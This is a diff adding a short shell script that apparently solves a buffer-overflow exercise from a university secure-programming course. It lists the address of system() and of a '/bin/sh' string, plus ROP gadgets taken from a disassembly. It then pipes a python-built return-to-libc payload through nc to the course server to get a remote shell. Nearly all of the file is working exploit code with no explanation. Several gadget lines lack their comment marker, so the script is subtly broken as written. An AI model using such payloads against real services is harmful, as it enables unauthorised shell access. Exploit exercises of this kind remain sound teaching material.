@@ -1,0 +1,20 @@
+#!/bin/sh
+# &system: 0x80483e0
+# binsh: 0804a030
+
+# gadgets
+# 80921eb:	5b                   	pop    %ebx
+# 80921ec:	c3                   	ret    
+ 809223c:	5e                   	pop    %esi
+ 809223d:	c3                   	ret    
+ 80922e0:	5f                   	pop    %edi
+ 80922e1:	c3                   	ret    
+ 80928a0:	5b                   	pop    %ebx
+ 80928a1:	5e                   	pop    %esi
+ 80928a2:	5f                   	pop    %edi
+ 80928a3:	5d                   	pop    %ebp
+ 80928a4:	c3                   	ret    
+ 8092a90:	31 c0                	xor    %eax,%eax
+ 8092a92:	c3                   	ret    
+
+(python -c "print 'a'*24 + '\xe0\x83\x04\x08' + 'a' * 4 + '\x30\xa0\x04\x08\n'" && cat) | nc secprog.cs.nctu.edu.tw 10108
